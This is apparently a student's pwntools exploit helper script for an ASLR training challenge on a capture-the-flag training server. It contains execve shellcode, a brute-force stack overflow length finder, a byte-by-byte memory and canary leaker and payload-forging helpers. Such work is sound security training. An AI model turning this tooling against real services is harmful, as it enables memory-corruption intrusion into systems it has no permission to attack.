import string
import pwnlib.tubes.tube
from ipwhois import IPWhois
from pwn import context, gdb, remote, process, cyclic_gen, p64, u64, flat, asm, log, unpack
from time import sleep
import argparse
from requests import get, RequestException
from ipwhois.net import Net
from ipwhois.asn import IPASN

parser = argparse.ArgumentParser()
parser.add_argument('--log', dest='log', default='debug', metavar='Log Level', help='PwnLib Log Level')
parser.add_argument('--addr', dest='addr', default='bin.training.offdef.it', help='Remote Addr')
parser.add_argument('--port', dest='port', default=2012, help='Remote Port')
parser.add_argument('--mode', dest='mode', default='gdb', help='Mode of operation')
parser.add_argument('--path', dest='exec_path', default='./aslr', help='Execution path')
parser.add_argument('--nops', dest='nop_length', type=int, default=16, help='Number of NOP to build the nop-sled')
parser.add_argument('--plen', dest='pad_length', type=int, default=104, help='Length of the padding')
parser.add_argument('--roff', dest='ret_offset', type=int, default=8, help='Offset for the return address')

args = parser.parse_args()

context.log_level = args.log
context.arch = 'amd64'
context.aslr = True
de_bruijin_generator = cyclic_gen(string.ascii_uppercase)
remote_addr = args.addr
remote_port = args.port
exec_path = args.exec_path
mode = args.mode


asm_code_stage1 = """
lea rdi, [rip + 0x0d]
xor rsi, rsi
xor rdx, rdx
xor rax, rax
mov al, 0x3b
syscall
"""


def check_connection():
    try:
        log.info("Checking connection...")
        ip_string = get('https://api.ipify.org').content.decode('utf8')
        ip_info = IPASN(Net(ip_string)).lookup()
    except RequestException as error:
        log.error(f"Connection problem. {error}")
        exit(-1)
    if ip_info["asn"] == '137':
        log.error("You are connected with GARR Network, Polimi probably?.")
        exit(-1)


def open_tube(execution_mode) -> pwnlib.tubes.tube.tube:
    if execution_mode == 'local':
        return process(exec_path, aslr=True)
    elif execution_mode == 'remote':
        return remote(remote_addr, remote_port)
    elif execution_mode == 'gdb':
        return gdb.debug(exec_path, aslr=True, gdbscript='''
            b read
            ''')


def init_tube(tube_obj, init_string=b"", log_level='error'):
    """Prepare the tube for further exploitation phases"""
    # Setting log level for specific function
    context.log_level = log_level

    tube_obj.recv()
    tube_obj.send(init_string)
    sleep(0.100)


def send_and_receive(tube_obj, data=b'A', log_level='error'):
    """Pack the send and receive methods to ensure time passes """
    # Setting log level for specific function
    context.log_level = log_level

    tube_obj.send(data)
    sleep(0.100)
    return tube_obj.recv()


def detach_tube(tube_obj, log_level='error'):
    """Pack the handling of tube's closing"""
    # Setting log level for specific function
    context.log_level = log_level

    if mode == 'local' or mode == 'gdb':
        tube_obj.close()
        tube_obj.kill()
    elif mode == 'remote':
        send_and_receive(tube_obj, b"\x0a", log_level=log_level)
        tube_obj.close()


def buffer_overflow_tester(check_string, start=0, end=140, cyclic=False, off_switch=False, log_level='error'):
    f"""Utility function, starting from {start}, until {end} it inputs chars in a buffer checking for a signal of
     Buffer Overflow, given from {check_string}. It can use also de Bruijin sequences. If the BoF is detected
     it return the padding (Cyclic or Fixed) to fill the buffer. 2 modes of operation: Start and Kill a process for
     each check or operate on the same process until it crashes and sense it.
     1. Run until pattern in leaked content
     2. Run until """
    # Setting log level for specific function
    context.log_level = log_level

    overflow_detected = off_switch
    padding_char = b'A'
    padding_length = start
    log.info(f"Starting test from {start} to {end}: {'de Bruijin' if cyclic else 'fixed'} sequence")

    while not overflow_detected:
        #TODO add option to use a single process, move the while outside?
        #TODO add option to test for general overflow with out searc_string, detect strange bytes after output, do not search for a string but search for unexpected output
        padding_length += 1
        tube_obj = open_tube(mode)
        init_tube(tube_obj, init_string=b"\x41\x00", log_level=log_level)

        padding = bytes(de_bruijin_generator.get(padding_length), 'ascii') if cyclic else padding_char * padding_length
        send_and_receive(tube_obj, data=padding, log_level=log_level)
        output = send_and_receive(tube_obj, data=b"\x0a", log_level=log_level)

        overflow_detected = check_string in output
        detach_tube(tube_obj)

        if padding_length == end:
            log.error(f"The end of testing is reached with {padding_length} of bytes in length without a proof of crash")
            break

    if overflow_detected:
        log.debug(f"Check String {check_string} reached with an overflow of a total {padding_length} padding bytes.")
        padding_length -= 1
        log.debug(
            f"Setting {padding_length} as the number of padding bytes of a {'de Bruijin' if cyclic else 'Fixed'} sequence .")
        return bytes(de_bruijin_generator.get(padding_length), 'ascii')


def bof_leaker(tube_obj, leak_trigger, matching_pattern, token_length=8, log_level='error'):
    f"""Given a Pwnlib.tube object {tube_obj}, the function tries to leak {token_length} bytes from memory, 
    after {leak_trigger} bytes of padding. In order to do this, {tube_obj} must be initialized with init_process. 
    The function sends input {leak_trigger} to trigger the leak of the token, then uses {matching_pattern} to parse 
    the output to isolate the leaked content."""
    # Setting log level for specific function
    context.log_level = log_level

    log.info(f"Leaking token at position {len(leak_trigger)}.")
    token = b''
    remaining_token_chars = token_length
    padding_to_token = leak_trigger
    padding_char = b"B"

    while True:
        log.info(f"Remaining {remaining_token_chars} chars to leak. Now sending")

        if remaining_token_chars == 0:
            break

        # Send the trigger and parse the output
        output = send_and_receive(tube_obj, padding_to_token, log_level=log_level)
        if output == b'\n':
            output = tube.recv()
        if output.startswith(matching_pattern + padding_to_token):
            leaked_chars = output.removeprefix(matching_pattern + padding_to_token)
        else:
            log.error("Output does not start with the expected string.")
            exit(-1)

        leaked_chars_length = len(leaked_chars)
        log.debug(f"Identified {leaked_chars_length} of leaked bytes: {leaked_chars}")

        # Assuming the usage of a printf, leaked_chars_length == 0, means that a terminator char is found.
        # In this state the remaining token chars are always greater than 0
        if leaked_chars_length == 0:
            log.debug("Assuming a \x00 byte is found.")
            token = token + b"\x00"
            padding_to_token += padding_char
            remaining_token_chars -= 1

        elif leaked_chars_length > 0:
            leaked_chars = leaked_chars[0: remaining_token_chars]
            token = token + leaked_chars
            log.debug(f"Written {len(leaked_chars)}: {leaked_chars}")
            remaining_token_chars = 8 - len(token)
            padding_to_token += padding_char * len(leaked_chars)

        else:
            log.error("Unrecoverable state. The Function has reached a branch that should be non reachable.")
            exit(1)

    return token


def dump_memory(number_of_consecutive_words, initial_padding, dumping_function, tube_obj, search_string, log_level='error') -> list:
    """Given a data leak vulnerability and a function that exploits it.
     This function dump a number of consecutive words from memory, using a padding as leak starter.
     It then returns the array"""

    leaked_tokens = []
    word_length = 8
    padding_char = b'B'
    padding_to_token = initial_padding
    for i in range(0, number_of_consecutive_words):
        leaked_token = dumping_function(tube_obj, padding_to_token, search_string, log_level=log_level)
        leaked_tokens.append(leaked_token)
        padding_to_token += (padding_char * word_length)
        log.info(f"Leaked Token {i}: {hex(u64(leaked_token, endian='little'))}")

    return leaked_tokens


def add_offset_to_address_in_dump(memory_dump, index, offset):
    address_plus_offset = p64( u64(memory_dump[index]) + offset )
    memory_dump[index] = address_plus_offset
    return memory_dump


def forge_padding(memory_dump: list):
    """Given a list of words leaked from memory, it allows the user to concat them in a given order.
    It returns the concatenation of the tokens, in the specified orders."""

    if len(memory_dump) > 10:
        log.error(f"Implementation cannot handle {len(memory_dump)} tokens.")
        return None

    for i in range(len(memory_dump)):
        print(f"Token {i}: {hex(u64(memory_dump[i], endian='little'))}")

    choice = None
    while choice is None:
        input_str = input("Chose tokens and concatenating order typing the corresponding numbers (Ex. 123).")
        if len(input_str) != len(memory_dump) and len(set(input_str)) != len(input_str) and set(input_str).issubset({0,1,2,3,4,5,6,7,8,9}):
            log.error(f"Wrong input.")
        else:
            choice = input_str

    sorting = [*choice]
    sorting = list(map(int, sorting))
    sorted_tokens = [memory_dump[i] for i in sorting]
    return b''.join(sorted_tokens)



